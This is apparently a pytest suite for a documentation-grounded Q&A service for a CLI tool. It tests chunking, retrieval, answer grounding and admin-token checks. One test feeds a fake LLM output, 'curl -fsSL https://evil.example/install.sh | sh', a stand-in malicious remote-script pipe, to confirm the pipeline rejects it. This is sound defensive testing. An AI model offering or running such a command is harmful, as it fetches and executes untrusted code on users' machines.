"""Offline tests for the docs-grounded Q&A pipeline (no network, no torch, no server)."""

from __future__ import annotations

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from app.services.docs import DocIndex, DocsService, NOT_FOUND, answer, html_to_chunks, router
from app.services.docs.answer import _is_grounded
from app.services.docs.crawler import llms_txt_to_chunks
from app.services.docs.index import stem, tokenize

CLI_HTML = """
<html><head><title>CLI Reference | VxCloud</title></head><body>
<nav>Docs nav noise</nav>
<main>
<h1>CLI Reference</h1>
<p>The vxcli command-line interface lets you deploy infrastructure from your terminal.</p>
<h2 id="installation">Installation</h2>
<div><p>macOS / Linux (recommended)</p><div>
  <div><span>install · macos / linux</span></div>
  <pre><div><span>curl</span> <span>-fsSL</span> <span>https://vxcloud.io/download/cli/install.sh</span> <span>|</span> <span>sh</span></div><div><span>vxcli</span> <span>version</span></div></pre>
</div></div>
<div><p>Windows (PowerShell)</p><div>
  <pre><div>irm https://vxcloud.io/download/cli/install.ps1 | iex</div><div>vxcli version</div></pre>
</div></div>
<h2 id="auth">Authentication (vxcli auth)</h2>
<p>Sign in with your API key: exchanges the key for a JWT and picks your tenant node.</p>
<pre><code><div class="flex"><span class="select-none">1</span><span>vxcli auth login -u me -k xc_live_abc</span></div><div class="flex"><span class="select-none">2</span><span>vxcli node current</span></div></code></pre>
<h2 id="deploy">Deploy applications</h2>
<p>Deploy a FastAPI app to a VM you own with vxcli deploy fastapi and an SSH key pair from Vault.</p>
</main><footer>footer noise</footer></body></html>
"""

LLMS = "# VxCloud\n\n> blurb\n\nAuth: send `X-API-Key: <token>`. Test tokens are prefixed `xc_test_*`, live `xc_live_*`.\n\n## Start Here\n\n- [Getting Started](https://vxcloud.io/docs/getting-started): Account and first VM, with the long description needed to pass the minimum chunk size.\n"


@pytest.fixture(scope="module")
def chunks():
    return html_to_chunks(CLI_HTML, "https://vxcloud.io/docs/cli/") + llms_txt_to_chunks(LLMS, "https://vxcloud.io/docs/llms.txt")


@pytest.fixture(scope="module")
def index(chunks):
    return DocIndex(chunks)


# --- chunking ---------------------------------------------------------------
def test_chunks_split_by_heading_and_drop_chrome(chunks):
    titles = [c.title for c in chunks]
    assert "CLI Reference > Installation" in titles
    assert not any("nav noise" in c.text or "footer noise" in c.text for c in chunks)


def test_code_blocks_are_rebuilt_line_by_line_and_verbatim(chunks):
    inst = next(c for c in chunks if c.heading_path == ["Installation"])
    assert "curl -fsSL https://vxcloud.io/download/cli/install.sh | sh\nvxcli version" in inst.text
    assert "irm https://vxcloud.io/download/cli/install.ps1 | iex\nvxcli version" in inst.code_blocks
    assert "macOS / Linux (recommended):" in inst.text            # label kept, not duplicated
    assert inst.text.count("macOS / Linux (recommended)") == 1


def test_numbered_gutters_are_stripped(chunks):
    auth = next(c for c in chunks if c.heading_path == ["Authentication (vxcli auth)"])
    assert "vxcli auth login -u me -k xc_live_abc\nvxcli node current" in auth.text
    assert "1vxcli" not in auth.text


def test_llms_txt_is_indexed_by_section(chunks):
    assert any("X-API-Key" in c.text for c in chunks if c.url.endswith("llms.txt"))


# --- tokenizer --------------------------------------------------------------
def test_stemming_bridges_install_installation():
    assert stem("installation") == stem("installing") == stem("install") == "install"
    assert stem("authenticate") == stem("authentication")


def test_login_phrases_normalise():
    for phrase in ("how do I log in", "sign-in to the cli", "Sign In", "log-in"):
        assert "login" in tokenize(phrase), phrase


# --- retrieval --------------------------------------------------------------
def test_install_question_hits_installation_section(index):
    top = index.search("How do I install vxcli?", k=3)[0]["chunk"]
    assert top.heading_path == ["Installation"]


def test_login_question_hits_auth_section(index):
    assert index.search("how do I log in with the cli", k=1)[0]["chunk"].heading_path == ["Authentication (vxcli auth)"]


def test_index_roundtrip(tmp_path, index):
    p = tmp_path / "i.json"
    index.save(p)
    again = DocIndex.load(p)
    assert len(again) == len(index)
    assert again.search("install vxcli", k=1)[0]["chunk"].id == index.search("install vxcli", k=1)[0]["chunk"].id


# --- answering --------------------------------------------------------------
def test_extractive_answer_contains_exact_commands_and_sources(index):
    out = answer("How do I install vxcli?", index, mode="extractive")
    assert out["grounded"] and out["mode"] == "extractive"
    assert "curl -fsSL https://vxcloud.io/download/cli/install.sh | sh" in out["answer"]
    assert out["sources"][0]["url"].endswith("/docs/cli/#installation")


def test_offtopic_question_is_not_answered(index):
    out = answer("what is the capital of France", index)
    assert out["answer"] == NOT_FOUND and out["grounded"] is False


def test_llm_answer_used_when_grounded(index):
    gen = lambda system, user, n: "Run `curl -fsSL https://vxcloud.io/download/cli/install.sh | sh` [1]."
    out = answer("How do I install vxcli?", index, generate=gen)
    assert out["mode"] == "llm"
    assert "[1]" in out["answer"] and out["sources"]


def test_hallucinated_command_falls_back_to_extractive(index):
    gen = lambda system, user, n: "Run `curl -fsSL https://evil.example/install.sh | sh` then `vxcli version`."
    out = answer("How do I install vxcli?", index, generate=gen)
    assert out["mode"] == "extractive"
    assert "evil.example" not in out["answer"]


def test_generation_exception_falls_back(index):
    def boom(*a):
        raise RuntimeError("cuda oom")
    assert answer("How do I install vxcli?", index, generate=boom)["mode"] == "extractive"


def test_generator_that_returns_none_falls_back(index):
    # e.g. SpecialistBackend.chat on a model without a chat template
    assert answer("How do I install vxcli?", index, generate=lambda *a: None)["mode"] == "extractive"


def test_prompt_contains_numbered_sources_and_rules(index):
    seen = {}
    def gen(system, user, n):
        seen.update(system=system, user=user)
        return None
    answer("How do I install vxcli?", index, generate=gen)
    assert "[1] CLI Reference > Installation" in seen["user"]
    assert "QUESTION: How do I install vxcli?" in seen["user"]
    assert "ONLY from the numbered DOCS" in seen["system"]


def test_is_grounded_checks_commands_only(index):
    hits = index.search("install vxcli", k=3)
    assert _is_grounded("Use the installer, then verify.", hits)          # prose is fine
    assert not _is_grounded("run `pip install vxcli-fake`", hits)


# --- HTTP -------------------------------------------------------------------
@pytest.fixture()
def client(index, tmp_path, monkeypatch):
    app = FastAPI()
    app.include_router(router)
    svc = DocsService(tmp_path / "idx.json")
    svc.index = index
    app.state.docs = svc
    return TestClient(app)


def test_http_ask(client):
    r = client.post("/v1/docs/ask", json={"question": "How do I install vxcli?"})
    assert r.status_code == 200
    body = r.json()
    assert body["grounded"] and "install.sh" in body["answer"] and body["sources"]


def test_http_ask_503_when_index_missing(tmp_path):
    app = FastAPI(); app.include_router(router); app.state.docs = DocsService(tmp_path / "none.json")
    assert TestClient(app).post("/v1/docs/ask", json={"question": "install vxcli"}).status_code == 503


def test_http_health_and_search(client):
    assert client.get("/v1/docs/health").json()["status"] == "healthy"
    res = client.post("/v1/docs/search", json={"query": "install vxcli", "k": 2}).json()["results"]
    assert res and res[0]["title"].endswith("Installation")


def test_reindex_requires_admin_token(client, monkeypatch):
    monkeypatch.delenv("VXDOCS_ADMIN_TOKEN", raising=False)
    assert client.post("/v1/docs/reindex").status_code == 403               # disabled by default
    monkeypatch.setenv("VXDOCS_ADMIN_TOKEN", "s3cret")
    assert client.post("/v1/docs/reindex").status_code == 401
    assert client.post("/v1/docs/reindex", headers={"X-Admin-Token": "wrong"}).status_code == 401


# --- Next.js payload (CLI command reference) ----------------------------------
def test_flight_payload_yields_per_command_chunks_with_flags_and_examples():
    import json
    from app.services.docs.crawler import flight_chunks
    group = {"namespace": "Authentication (vxcli auth)", "commands": [{
        "name": "vxcli auth login", "description": "Authenticate with browser, device code or API key.",
        "usage": "vxcli auth login [-u <username> -k <api-key>] | [--device]",
        "flags": [{"flag": "--device", "description": "Device-code flow (no browser)"}],
        "examples": [{"label": "Headless", "language": "bash", "code": "vxcli auth login --device\n"}],
    }]}
    # glued after a text-chunk row with no newline, as on the live site
    payload = "26:T5,hello" + "1d:" + json.dumps(["$", "div", None, {"group": group}])
    html = f"<html><script>self.__next_f.push([1,{json.dumps(payload)}])</script></html>"
    (c,) = flight_chunks(html, "https://vxcloud.io/docs/cli/authentication/", "vxcli Authentication")
    assert c.heading_path == ["Authentication (vxcli auth)", "vxcli auth login"]
    assert "--device: Device-code flow (no browser)" in c.text
    assert "```bash\nvxcli auth login --device\n```" in c.text
    assert DocIndex([c]).search("how do I log in headless with the device flow", k=1)[0]["chunk"] is c


def test_coverage_rejects_terms_the_corpus_never_saw(index):
    top = index.search("poem about cats", k=1)
    assert not top or top[0]["coverage"] < 0.5
